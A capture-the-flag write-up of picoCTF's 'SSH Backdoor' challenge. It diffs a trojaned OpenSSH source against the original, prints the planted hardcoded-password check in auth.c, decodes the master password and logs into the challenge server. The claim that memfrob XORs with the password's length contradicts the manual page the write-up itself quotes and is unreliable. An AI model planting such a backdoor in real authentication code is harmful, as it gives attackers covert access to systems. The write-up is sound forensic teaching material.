### Solved by superkojiman

SSH Backdoor is a 100 point forensics challenge. 

> Some hackers have broken into my server backdoor.picoctf.com and locked my user out (my username is jon). I need to retrieve the flag.txt file from my home directory. 
The last thing we noticed in out network logs show is the attacker downloading this. Can you figure out a way to get back into my account?

The network logs showed a download of [openssh-6.7p1-evil.tar.gz](https://picoctf.com/problem-static/forensics/SSHBackdoor/openssh-6.7p1-evil.tar.gz). The hint for this challenge suggests that a backdoor was left in this version of OpenSSH. So if we can find the backdoor, we can figure out how to login to the server. I downloaded the backdoored OpenSSH, and also grabbed the original clean version from [http://openbsd.cs.toronto.edu/pub/OpenBSD/OpenSSH/portable/openssh-6.7p1.tar.gz](here). I unpacked the backdoored version into a directory called evil, and the clean version into a directory called orig:

```
$ mkdir evil; tar xvzf openssh-6.7p1-evil.tar.gz -C evil
$ mkdir orig; tar xvzf openssh-6.7p1 -C orig 
```

Now let's check to see what files are different. Quickest way was to just use the cmp command:

```
$ for i in evil/openssh-6.7p1/*; do if [[ ! -d $i ]]; then cmp $i orig/openssh-6.7p1/`basename $i`; fi  ;done
evil/openssh-6.7p1/auth-passwd.c orig/openssh-6.7p1/auth-passwd.c differ: char 3621, line 115
cmp: EOF on orig/openssh-6.7p1/auth.c
evil/openssh-6.7p1/auth.h orig/openssh-6.7p1/auth.h differ: char 7091, line 214
```

Looks like auth.c has been modified in the backdoored version. Let's have a look at the changes: 

```
$ diff evil/openssh-6.7p1/auth.c orig/openssh-6.7p1/auth.c
777,794d776
<
< static int frobcmp(const char *chk, const char *str) {
<   int rc = 0;
<   size_t len = strlen(str);
<   char *s = xstrdup(str);
<   memfrob(s, len);
<
<   if (strcmp(chk, s) == 0) {
<       rc = 1;
<   }
<
<   free(s);
<   return rc;
< }
<
< int check_password(const char *password) {
<   return frobcmp("CGCDSE_XGKIBCDOY^OKFCDMSE_XLFKMY", password);
< }
```

So the backdoor is pretty simple. It takes the user's password, calls memfrob() on it, and if it matches the string "CGCDSE_XGKIBCDOY\^OKFCDMSE_XLFKMY", then it lets the user in. What does memfrob() do? According to its manual page:

> The memfrob() function encrypts the first n bytes of the memory area s by exclusive-ORing each character with the number 42.  The effect can be reversed by using memfrob() on the encrypted memory area.

So it just XORs the password using a key, in this case, the length of the password. To decrypt the password "CGCDSE_XGKIBCDOY\^OKFCDMSE_XLFKMY", we just need to XOR it with its length. The following C code does just that:

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

int main(int argc, char *argv[]) {
    char *s = "CGCDSE_XGKIBCDOY^OKFCDMSE_XLFKMY";
    char *t = strdup(s); 
    size_t len = strlen(s); 

    memfrob(t, len);
    printf("%s\n", t); 
    return 0; 
}
```

We compile and run it, and it gives us the password:

```text
$ gcc decrypt.c -o decrypt
$ ./decrypt 
iminyourmachinestealingyourflags
```

Let's try to login:

```text
$ ssh jon@backdoor.picoctf.com
The authenticity of host 'backdoor.picoctf.com (23.21.109.77)' can't be established.
RSA key fingerprint is 69:2c:9a:4c:64:f3:e3:2a:0a:d9:b1:9a:59:de:32:71.
Are you sure you want to continue connecting (yes/no)? yes
Warning: Permanently added 'backdoor.picoctf.com,23.21.109.77' (RSA) to the list of known hosts.
jon@backdoor.picoctf.com's password:
Last login: Sat Nov  1 20:23:59 2014 from 184.72.219.127
jon@ip-10-45-162-116:~$ ls
flag.txt
jon@ip-10-45-162-116:~$ cat flag.txt
ssshhhhh_theres_a_backdoor
```

Success! We logged in, found a flag.txt, and read its contents. The flag is **ssshhhhh_theres_a_backdoor**
